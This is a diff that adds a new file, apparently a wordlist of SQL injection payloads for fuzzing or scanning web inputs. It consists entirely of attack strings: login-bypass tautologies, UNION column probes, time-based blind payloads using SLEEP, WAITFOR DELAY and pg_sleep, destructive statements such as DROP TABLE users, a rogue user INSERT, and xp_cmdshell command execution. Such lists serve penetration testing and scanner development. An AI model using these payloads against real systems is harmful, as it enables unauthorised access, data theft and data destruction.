@@ -1,0 +1,91 @@
+'
+''
+`
+``
+,
+"
+""
+\
+\\
+;
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+') OR ('1'='1'--
+" OR "1"="1
+" OR "1"="1"--
+" OR 1=1--
+" OR 1=1#
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' GROUP BY 1--
+1' GROUP BY 2--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+" UNION SELECT 1,2,3--
+1; DROP TABLE users--
+'; DROP TABLE users--
+'; INSERT INTO users VALUES ('evil','evil')--
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT * FROM users)--
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' AND 1=1 WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+1; SELECT SLEEP(5)--
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+' OR 1=1 LIMIT 1--
+' HAVING 1=1--
+' HAVING 1=2--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+' AND '1'='1
+' AND '1'='2
+'='
+SLEEP(5)
+BENCHMARK(5000000,MD5(1))
+' AND BENCHMARK(5000000,MD5(1))--
+pg_sleep(5)
+'; SELECT pg_sleep(5)--
+WAITFOR DELAY '0:0:5'
+'; EXEC xp_cmdshell('ping 127.0.0.1')--
+'; EXEC sp_executesql N'SELECT 1'--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT 'x',NULL,NULL--
+1; EXEC xp_cmdshell('whoami')--
+' AND 1=1--
+' AND 2=1--
+' OR 2=1--
+1 AND SLEEP(5)
+1 OR SLEEP(5)
+') AND ('1'='1
+') AND ('1'='2
+") AND ("1"="1
+") AND ("1"="2
+' ORDER BY 1,2,3--
+') ORDER BY 1--
+") ORDER BY 1--
+%27 OR %271%27=%271
+%22 OR %221%22=%221
+0x27 OR 0x271=0x271
+\' OR \'1\'=\'1
+\x27 OR \x271\x27=\x271
